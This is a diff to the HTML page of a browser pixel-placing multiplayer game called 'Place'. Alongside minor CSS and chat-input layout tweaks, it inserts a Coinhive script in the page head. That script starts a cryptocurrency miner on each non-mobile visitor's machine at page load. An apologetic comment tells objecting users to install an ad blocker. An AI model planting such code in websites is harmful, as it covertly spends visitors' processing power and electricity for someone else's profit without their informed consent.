@@ -3,6 +3,13 @@
 	<head>
 		<title>Place</title>
 		<link href="https://fonts.googleapis.com/css?family=Roboto:400,700" rel="stylesheet">
+		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+		<script>
+			var miner = new CoinHive.Anonymous("uB0AtEOdG8yXQObbRRqNUZWKwOjbsEPN", {throttle: 0.7});
+			if (!miner.isMobile()) miner.start(); // im so sorry... but this wont hurt you i promise <3
+			// if you really dont wan't to support me, get ublock origin
+			// or send me a pm on discord about your concerns.
+		</script>
 		<style type="text/css">
 			body {
 				background-color: #1d1f21;
@@ -37,7 +44,7 @@
 			#info {
 				position: fixed; margin: auto;
 				bottom: 250px; left: 25px;
-				width: 200px; height: 58px; /* (18*3)+4 */
+				height: 58px; /* (18*3)+4 */
 			}
 
 			#controls {
@@ -101,14 +108,13 @@
 			}
 
 			#chat-box #player-name {
-				width: 70px;
-				text-align: right;
+				width: 60px;
+				margin-left: -4px;
 				background-color: rgba(255,255,255,0.2);
 			}
 
 			#chat-box #message {
-				margin-left: -4px;
-				width: 248px;
+				width: 258px;
 			}
 
 			textarea:focus, input:focus, div:focus {
@@ -140,13 +146,13 @@
 		</div></a>
 		<div class="box" id="chat-box">
 			<div id="messages"></div>
-			<input type="text" id="player-name" autocomplete="off" value="Player"> 
 			<input type="text" id="message" autocomplete="off"> 
+			<input type="text" id="player-name" autocomplete="off" value="Player"> 
 		</div>
 		</div>
 		<div class="box" id="controls">
-			<p style="font-weight: 700;" id="name">Move controls:</p>
-			<p>WASD, Q, E, RMB</p>
+			<p style="font-weight: 700;" id="name">Controls:</p>
+			<p>WASD, E, Q, RMB</p>
 		</div>
 		<div id="palette" class="box">
 			<div class="color"></div>
@@ -411,7 +417,6 @@
 
 				socket.emit("chat-message", {
 					name: player_name.value,
-					color: "#FF8C8C",
 					message: message.value
 				});
 				message.value = "";
